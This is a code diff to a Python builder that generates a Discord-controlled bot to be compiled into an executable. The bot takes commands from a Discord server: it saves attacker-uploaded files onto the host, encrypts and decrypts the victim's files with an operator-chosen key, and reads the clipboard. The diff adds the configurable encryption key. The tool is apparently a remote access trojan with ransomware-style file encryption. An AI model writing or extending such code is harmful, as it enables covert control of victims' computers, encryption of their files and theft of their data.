@@ -19,8 +19,9 @@ while True:
     prefix = input("[i] Enter the desired prefix>> ")
     exe_name = input("[i] Enter name of the compiled executable file>> ")
     server_name = input("[i] Enter name of the discord server>> ")
+    cryp_key = input("[i] Enter the key for file encryption/decryption>> ")
 
-    print(f"[i] Generating script {exe_name}.py")
+    
     x = (r"""
 from nextcord.ext import commands 
 import nextcord
@@ -202,25 +203,26 @@ async def send(ctx, *, loc=""):
     else:
         locs =  f'{loc}\\{attachment.filename}'
     await attachment.save(locs)
-    await ctx.send(f"```Saved file to : '{locs}'```")
+    await ctx.send(f"```Saved file to : '{locs}'```")"""+(r"""
 #############################################################
+key=b'{0}'
 @bot.command()
 async def encrypt(ctx, *, file):
-
+    
     try:
-        samsac2.encrypt(file)
-        await ctx.send(f'```Encryped {file} successfully')
+        samsac2.encrypt(file, key)
+        await ctx.send(f'```Encryption successful```')
     except Exception as e:
-        await ctx.send(f'```{e}```')
+        await ctx.send(e)
 
 @bot.command()
 async def decrypt(ctx, *, file):
     
     try:
-        samsac2.decrypt(file)
-        await ctx.send(f'```Decrypted {file} successfully')
+        samsac2.decrypt(file, key)
+        await ctx.send(f'```Decryption successful```')
     except Exception as e:
-        await ctx.send(f'```{e}```')
+        await ctx.send(e)""".format(cryp_key))+r"""
 ##############################################################3
 @bot.command()
 async def clipboard(ctx):
